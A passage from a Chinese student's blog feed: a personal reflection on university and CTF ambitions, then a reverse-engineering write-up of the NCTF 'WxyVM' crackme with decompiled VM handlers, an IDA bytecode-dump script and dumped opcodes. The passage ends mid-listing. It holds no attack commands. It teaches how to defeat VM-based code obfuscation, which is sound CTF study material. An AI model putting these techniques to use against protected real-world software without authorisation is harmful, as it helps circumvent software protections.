    <content type="html"><![CDATA[<p>前端时间电脑崩了，丢失了太多文件与数据，糟心啊！说不难受都是假的！又因为unctf比赛，所以今天才把博客给恢复过来！不过我觉得我这次是要好好思考一番了！</p><a id="more"></a><h2 id="起初，我也是带着美好的愿望出发的！"><a href="#起初，我也是带着美好的愿望出发的！" class="headerlink" title="起初，我也是带着美好的愿望出发的！"></a>起初，我也是带着美好的愿望出发的！</h2><blockquote><p>从小的时候，就梦想着以后能够强大起来，像赛亚人保护地球那种！哈，我呢！对长大后的希望就是“在朋友们不顺心或者失意的时候可以随时出现在他们身边”，然后再有一个稳定的工作，工作之余去做自己喜欢的事，见相见的人！与他们一起去看漫展，一起搭火烤串，一起抓鱼，一起“开会”，一起畅谈，一起看书，一起建个大的室内体育场，一起打着乒乓，羽毛与篮球，一起再去外面世界转个一转，闻闻花香，见见海涌！而一定，我的想要不止这些！或许早有些，已忘记，早有些，不允许再提起！于是我便朝着这个方向去走着，因为决心不够，没能够清楚看清大局势！输了高考！</p></blockquote><h2 id="其实它们很遥远，走着真的来不及！"><a href="#其实它们很遥远，走着真的来不及！" class="headerlink" title="其实它们很遥远，走着真的来不及！"></a>其实它们很遥远，走着真的来不及！</h2><blockquote><p>还好上天眷顾，又给了我一次觉醒的机会，进了很普通的二本学校，比整个大学二本专业最低录取线高1分！真的感谢，被命运原谅了，但原谅归原谅，再被相信就难了，我可要好好抓住这次改过的机会并且不能再失败，我计划的期望时间是2年，要找到自信的自我，进而再稳定朝着第一步的工作努力！之后的就暂且后面再说！前期没有人能指引着大学我该建立一个怎样的大路线去走，只好自己摸索着走！加学生会，各种社团…,然后就这样还挺开心的过了1月（或许吧），突然发现，我并不能去走社交这条路！进了计算机行业，当然是允许去选择做其他事情的，但必须要保证自己的专业知识要过关，甚至佼佼者水平！可我连C语言都还看不明白呢！</p></blockquote><h2 id="当方向错了，停止就是进步"><a href="#当方向错了，停止就是进步" class="headerlink" title="当方向错了，停止就是进步"></a>当方向错了，停止就是进步</h2><blockquote><p>刚好学校有个信息安全实验室，2017创建的，主要正是招向我们这个渗透测试班的（恍然明白了，如果那年没有新开这个专业，我或许就写不了这篇反思了）当时很明白，在一所普通的院校，也许用专业比赛证书去弥补下学校层次的缺陷！不管怎么样，必须要加入！想的很美好，可学生会那边已经退不了了！我就这样，丢掉了一年有效时间！这一年下来，经历了总归是有用的，也认识了几个有趣的朋友，但内心深处我觉得大一一年，我对自己很失望！暑假的时候，组长和大三的杨学长带我去西安打了场CTF比赛，和大佬们相处，我还认识到自己，真的太弱了，不会说话，像个木头！我自己都觉得这已经涉及到尊重与修养上了！可我还是像个木头一样！失望至极！</p></blockquote><h2 id="不胜感激，不止前进！"><a href="#不胜感激，不止前进！" class="headerlink" title="不胜感激，不止前进！"></a>不胜感激，不止前进！</h2><blockquote><p>西安之行，有高铁，有华山，还有第一次的线下比赛，长见识啊，还有一部K3，兴奋呐！组长给说，学习一定要有计划，今天要做什么，这周要完成什么，这个月要完成什么，都要做个规划！另外把去年丢的时间要补回来！我觉得，真的，有人带着的感觉真好！但一定接下来的总归要自己走！不过路上有人给了正确的指引，都要铭记在心！不胜感激。不止前进！</p></blockquote><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><blockquote><p>而处于大二阶段的我，可没有想象中的跑起来！我本着多学实验室的内容，绝大部分不曾听过班课！发现到其实是得不偿失的选择！觉得到从进入大学到现在做的得不偿失的事太多了！心里满满的愧疚，离我自己的目标里的太远了，就拿这1，2周来说吧，有些上进心不够，或许是因为一直学却得不到反馈而着急了吧,不过这事，急不得的，所以，今天不得不写个稍长的文章来反思下自己，要一步一步来，谁内心慌了，就会出局的！上面定的2年时间马上就快到了，没有事情是突然做成的，必然是个渐进的过程！除此之外，要活跃起来呢，要舒展起来呢！</p></blockquote><h2 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h2><blockquote><p>近期计划：英语四级，二进制学习，期末考试，下年ACM，ISCC，强网杯</p></blockquote><h2 id="高度自律即绝对自由"><a href="#高度自律即绝对自由" class="headerlink" title="高度自律即绝对自由"></a>高度自律即绝对自由</h2><blockquote><p>这部分就不多说了，坚持就是了！每天早起，每天锻炼，每天反思，每天静心，每天进步！<br>我还有个梦想：寻找小伙伴，走进新世界！野心，就请你一起膨胀起来吧！</p></blockquote><h2 id="我心永恒！"><a href="#我心永恒！" class="headerlink" title="我心永恒！"></a>我心永恒！</h2><blockquote><p><img src="https://s2.ax1x.com/2019/11/02/KLL6BT.jpg" alt="KLL6BT.jpg"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前端时间电脑崩了，丢失了太多文件与数据，糟心啊！说不难受都是假的！又因为unctf比赛，所以今天才把博客给恢复过来！不过我觉得我这次是要好好思考一番了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="疯狂的木头" scheme="http://yoursite.com/tags/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B4/"/>
    
  </entry>
  
  <entry>
    <title>Nctf WxyVM</title>
    <link href="http://yoursite.com/2019/10/14/Nctf%20WxyVM/"/>
    <id>http://yoursite.com/2019/10/14/Nctf WxyVM/</id>
    <published>2019-10-14T13:48:29.000Z</published>
    <updated>2019-10-15T13:48:47.821Z</updated>
    
    <content type="html"><![CDATA[<p>前十多天，初学pwn，导致一直没有看逆向，而前两天遇到个VM题，一点思路没有，于是开始来学习下VMProtect；这道题终于算是有了个了解，觉得自己汇编有点差劲呢！<br>VMProtetct 的题太好时间了，//尽管这可能并算不上难题，因为这里面还没有垃圾代码以及多余判断，<br>第一次做VM，记录下</p><a id="more"></a><h1 id="了解VMProtect"><a href="#了解VMProtect" class="headerlink" title="了解VMProtect"></a>了解VMProtect</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//www.52pojie.cn/forum.php?mod=viewthread&amp;tid=713219</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//zhuanlan.zhihu.com/p/27067133</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//zhuanlan.zhihu.com/p/28176139</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.freebuf.com/column/174623.html</span></span><br><span class="line"></span><br><span class="line">github之VMProtect：</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//github.com/lmy375/awesome-vmp</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">本题参考wp：</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//radishes.top/2018/12/11/2018-12-11-%E9%80%86%E5%90%91VM%E7%B1%BB%E5%9E%8B/</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.itread01.com/content/1543881789.html</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/15/KPdiPs.png" alt="KPdiPs.png"></p><h3 id="进入main-函数"><a href="#进入main-函数" class="headerlink" title="进入main()函数;"></a>进入main()函数;</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This is a %s\nplz input your flag:"</span>, aWcyvm1);<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// This is a WcyVM1</span></span><br><span class="line">                                                <span class="comment">// plz input your flag:</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400DB7() )             <span class="comment">// sub_400DB7是 一个 VM虚拟机</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"flag is your input"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"didixingwei"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>主函数中没有什么特别的</p></blockquote><h3 id="进去分析下-sub-400DB7"><a href="#进去分析下-sub-400DB7" class="headerlink" title="进去分析下 sub_400DB7"></a>进去分析下 sub_400DB7</h3><blockquote><p>函数内部我已经重命名了，方便我们理解，另外下面  类似这样的代码 [VM_EIP[1] - 1]   真实的意思 是     zijiema[VM_EIP+1]-1  (VM_EIP指向相当于cpu中的rip)</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">_<span class="function">BOOL8 <span class="title">sub_400DB7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">void</span> *zijiema; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> *R[<span class="number">0</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> *R1; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> *R2; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> *R3; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *VM_RSP; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  _DWORD *VM_EIP; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  zijiema = <span class="built_in">malloc</span>(<span class="number">0x200</span>uLL);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1400</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;R[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(zijiema, dword_6021C0, <span class="number">0x190</span>uLL);      <span class="comment">// &amp;unk_6021C0指针  是VMP字节码：VM_DATA（有点相当于CPU中的每个指令）   </span></span><br><span class="line">  R[<span class="number">0</span>] = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">0x38</span>uLL);                <span class="comment">// 初始化 虚拟机，保存物理寄存器到  虚拟机寄存器数组VM_CONTEXT;这里我们重命名为R[0],方便读阅</span></span><br><span class="line">                                                <span class="comment">// 而 CMP中的 EDI寄存器中存储的地址，就是虚拟机寄存器数组的起始地址；</span></span><br><span class="line">                                                <span class="comment">// rax     R0</span></span><br><span class="line">  R1 = R[<span class="number">0</span>] + <span class="number">1</span>;                                <span class="comment">// rbx     R1</span></span><br><span class="line">  R2 = R[<span class="number">0</span>] + <span class="number">2</span>;                                <span class="comment">// rcx     R2</span></span><br><span class="line">  R3 = R[<span class="number">0</span>] + <span class="number">3</span>;                                <span class="comment">// R3</span></span><br><span class="line">  VM_RSP = v3 + <span class="number">5120</span>;                           <span class="comment">// RBP   相当于 VMP中的栈顶   </span></span><br><span class="line">  v9 = v3 + <span class="number">5120</span>;                               <span class="comment">// rbp</span></span><br><span class="line">  VM_EIP = zijiema;                             <span class="comment">// VM_EIP (VMP中的ESI寄存器) 指向 VMP字节码的某个地址，起初让其指向VMP的首指针，</span></span><br><span class="line">                                                <span class="comment">// 所以，可以推断处  V10 是VM_EIP</span></span><br><span class="line">LABEL_26:</span><br><span class="line">  <span class="keyword">while</span> ( *VM_EIP )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">char</span>)*VM_EIP )                    <span class="comment">// 每有一个case 就对应一个 Handler </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:                                   <span class="comment">// mov R[VM_EIP[1]-1] =  VM_EIP[2]  ;  VM_EIP+=3*4  </span></span><br><span class="line">                                                <span class="comment">// 其实这里   VM_EIP可以相当于是 i   即 i+=3*12</span></span><br><span class="line">        sub_40082B((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], VM_EIP[<span class="number">2</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:                                   <span class="comment">// pop R[VM_EIP[i+1]-1];  VM_EIP 即 i=i+2*4</span></span><br><span class="line">        sub_40096D((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (_DWORD **)&amp;VM_RSP, &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:                                  <span class="comment">// push R[VM_EIP[i+1]-1];   i=i+2*4</span></span><br><span class="line">        sub_400927((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], &amp;VM_RSP, &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:                                  <span class="comment">// R0=getchar();i+=1*4</span></span><br><span class="line">        sub_4009B3(R[<span class="number">0</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:                                  <span class="comment">// putchar(R0)  ;i+=1*4</span></span><br><span class="line">        sub_4009E5(R[<span class="number">0</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">        sub_400B5D(&amp;v1, (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);<span class="comment">// 有点多  见里面注释吧，然后 i+=3*4</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">        sub_400A34(&amp;VM_EIP, VM_EIP[<span class="number">1</span>], (__int64)zijiema);<span class="comment">// jump i+1</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">15</span>:                                  <span class="comment">// if    v1==0x80   jump i+=2*4</span></span><br><span class="line">                                                <span class="comment">// else  jump i= 4*(i+1)</span></span><br><span class="line">        sub_400AAF(v1, (<span class="keyword">signed</span> __int64 *)&amp;VM_EIP, VM_EIP[<span class="number">1</span>], (__int64)zijiema);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        sub_400A61(v1, (<span class="keyword">signed</span> __int64 *)&amp;VM_EIP, VM_EIP[<span class="number">1</span>], (__int64)zijiema);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">        sub_400AFD((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], &amp;VM_EIP);<span class="comment">// r0++; i+=2*4</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">        sub_400B2D((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], &amp;VM_EIP);<span class="comment">// r0--; i+=2*4</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">        sub_400C0E((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], VM_EIP[<span class="number">2</span>], &amp;VM_EIP);<span class="comment">// r0+=VM_EIP[i+2]   i=3*4</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">20</span>:                                  <span class="comment">// 两个寄存器  相加    i+=3*4</span></span><br><span class="line">        sub_400C43((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">21</span>:                                  <span class="comment">// 寄存器  等于  寄存器^( i+2)      ；i=i+3</span></span><br><span class="line">        sub_400C7C((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], VM_EIP[<span class="number">2</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">22</span>:                                  <span class="comment">// 寄存器等于寄存器  &amp;寄存器     i+=12</span></span><br><span class="line">        sub_400CB1((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">23</span>:                                  <span class="comment">// 寄存器等于寄存器  | 寄存器     i+=12</span></span><br><span class="line">        sub_400CEA((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">25</span>:                                  <span class="comment">// 寄存器左  =寄存器（右）    i+=12</span></span><br><span class="line">        sub_400858((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">26</span>:                                  <span class="comment">// 寄存器左  =寄存器（右）的地址    i+=12</span></span><br><span class="line">        sub_400889((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (<span class="keyword">unsigned</span> __int64)(&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">27</span>:                                  <span class="comment">// 将第二个寄存器中存的地址中的值传给第一个寄存器  i+=12</span></span><br><span class="line">        sub_4008BA((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">28</span>:                                  <span class="comment">// // 将第二个寄存器中存的指针所指向的值传给第一个寄存器</span></span><br><span class="line">        sub_4008EF((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], (&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">2</span>] - <span class="number">1</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">29</span>:                                  <span class="comment">// 寄存器*=(i+2)</span></span><br><span class="line">        sub_400D23((&amp;R[<span class="number">0</span>])[VM_EIP[<span class="number">1</span>] - <span class="number">1</span>], VM_EIP[<span class="number">2</span>], &amp;VM_EIP);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> sub_400D59((__int64)v9);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_400A17(&amp;VM_EIP);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面函数详细见 注释：（分析了好久好久，汇编有些弱），接下来我们找下虚拟机字节码在呢，我们可分析知 在dword_6021C0指向地址处</p></blockquote><h4 id="ida脚本把字节码跑出来"><a href="#ida脚本把字节码跑出来" class="headerlink" title="ida脚本把字节码跑出来"></a>ida脚本把字节码跑出来</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auto i,start,end;<span class="comment">//,num;</span></span><br><span class="line">start = <span class="number">0x6021C0</span>;</span><br><span class="line">end = <span class="number">0x602350</span>;</span><br><span class="line">Message(<span class="string">"<span class="subst">\n</span>---------<span class="subst">\n</span>"</span>);</span><br><span class="line">for(i=start;i&lt;end;i=i+<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">Message(<span class="string">"0x%x,"</span>,Dword(i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x8</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x8</span>,<span class="number">0x3</span>,<span class="number">0x46</span>,<span class="number">0xe</span>,<span class="number">0x15</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0x9</span>,<span class="number">0x2</span>,<span class="number">0xb</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0xa</span>,<span class="number">0x2</span>,<span class="number">0x9</span>,<span class="number">0x1</span>,<span class="number">0x11</span>,<span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x8</span>,<span class="number">0x3</span>,<span class="number">0x47</span>,<span class="number">0xe</span>,<span class="number">0x46</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0x1a</span>,<span class="number">0x2</span>,<span class="number">0x6</span>,<span class="number">0x1d</span>,<span class="number">0x1</span>,<span class="number">0x4</span>,<span class="number">0x14</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1b</span>,<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x1d</span>,<span class="number">0x1</span>,<span class="number">0x6e</span>,<span class="number">0x13</span>,<span class="number">0x1</span>,<span class="number">0x63</span>,<span class="number">0x15</span>,<span class="number">0x1</span>,<span class="number">0x74</span>,<span class="number">0x13</span>,<span class="number">0x1</span>,<span class="number">0x66</span>,<span class="number">0x1c</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x9</span>,<span class="number">0x1</span>,<span class="number">0x11</span>,<span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xf</span>,<span class="number">0x22</span>,<span class="number">0x64</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">//后面是多输出的，不过可忽略！  取上面就好！</span></span><br><span class="line"><span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br></pre></td></tr></table></figure><h4 id="gt-我们通过分析-每个case对应的handler，这里我们只将-case-100-和default之外的handler-转换为-汇编代码，"><a href="#gt-我们通过分析-每个case对应的handler，这里我们只将-case-100-和default之外的handler-转换为-汇编代码，" class="headerlink" title="&gt; 我们通过分析 每个case对应的handler，这里我们只将  case 100  和default之外的handler 转换为   汇编代码，"></a>&gt; 我们通过分析 每个case对应的handler，这里我们只将  case 100  和default之外的handler 转换为   汇编代码，</h4><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 